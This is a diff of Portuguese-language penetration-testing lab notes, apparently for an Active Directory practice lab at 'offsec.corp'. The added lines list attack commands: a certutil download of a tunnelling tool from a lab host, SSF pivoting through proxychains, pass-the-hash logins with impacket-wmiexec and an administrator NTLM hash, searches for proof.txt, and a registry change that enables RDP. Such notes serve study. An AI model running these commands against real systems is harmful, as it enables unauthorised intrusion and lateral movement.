@@ -7130,13 +7130,14 @@ IP 253 é o AD [FullNotes](/FILES/lab-ad-pplus) LIVE - [YouTube](https://youtu.b
 	baixa do site (https://securesocketfunneling.github.io/ssf/#download)
 	certutil -urlcache -f http://192.168.200.133/ssf.zip ssf.zip
 	expand-archive ssf.zip -destinationpath ssf
-	-- roda pra escutar no windows AD conectando com o 223
- 	-- roda no kali escutando a conexão usado o ssf no kali
-	proxychains -q 
-	
-	
-	
-
+	AD IMPACKET-WMIEXEC .\ssfd.exe -p 1111
+	KALI /ssf -D 2222 -p 1111 192.168.200.253 # CONECTA NA PORTA 1111 DO SERVIDOR E ABRE A PORTA 5555 DO LADO DO KALI PARA FECHAR A CONEXÃO
+	KALI proxychains -q impacket-wmiexec -hashes “aad3b435b51404eeaad3b435b51404ee:f2535a22448907ddffad7bddef5c53e2” “offsec.corp/administrator”@192.168.200.252 hostname
+	proxychains -q impacket-wmiexec -hashes “aad3b435b51404eeaad3b435b51404ee:f2535a22448907ddffad7bddef5c53e2” “offsec.corp/administrator”@192.168.200.252
+	AD dir type proof.txt
+	AD where /r c: proof.txt ou dir /s proof.txt
+	AD type c:\proof.txt
+	powershell -c ‘Set-ItemProperty -Path “HKLM:\System\CurrentControlSet\Control\Terminal Server” -name “fDenyTSConnections” -value 0’ (HABILITA RDP)
 
 - Teorias
 
